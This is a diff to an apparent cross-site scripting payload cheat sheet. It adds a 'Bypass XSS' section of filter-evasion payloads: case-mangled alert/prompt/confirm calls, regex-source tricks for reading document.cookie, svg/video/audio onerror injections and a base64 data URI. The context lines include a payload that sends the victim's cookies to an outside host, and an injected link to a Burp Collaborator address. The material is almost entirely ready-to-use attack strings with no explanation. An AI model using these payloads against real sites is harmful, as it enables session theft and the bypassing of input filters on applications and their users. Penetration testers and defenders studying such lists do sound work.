@@ -27,6 +27,32 @@ i.src="http://192.168.0.18:8888/?"+document.cookie;
 "><a%20href="https://xxxxxxxxxxxxxxx.burpcollaborator.net"><H1>Click%20here!</H1></a><input
 
 ==============================================================================
+[+] Bypass XSS
+==============================================================================
+Alert('xss')
+AlErt('xss')
+Alert(/xss/.source)
+Prompt('xss')
+PrOmpT(444)
+Confirm('xss')
+CoNfiRm(123)
+Window[/alert/.source](8)
+WiNdoW[/alert/.source](8)
+with(document)alert(cookie)
+alert(document['cookie'])
+AlErT(document['cookie'])
+alert(document[/cookie/.source])
+AlErT(document[/cookie/.source])
+alert(document[/coo/.source/kie/.source])
+<svg/onload=alert(1)>
+<svg/onload=AleRt(1)>
+<video src=x onerror=alert(1);>
+<video src=x onerror=AlErt(1);>
+<audio src=x onerror=alert(1);>
+<audio src=x onerror=AlErt(1);>
+Data:text/html;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==
+
+==============================================================================
 [+] Bypass Content-security-policy header XSS
 ==============================================================================
 # https://medium.com/@bhavesh_thakur/content-security-policy-csp-bypass-techniques-e3fa475bfe5d
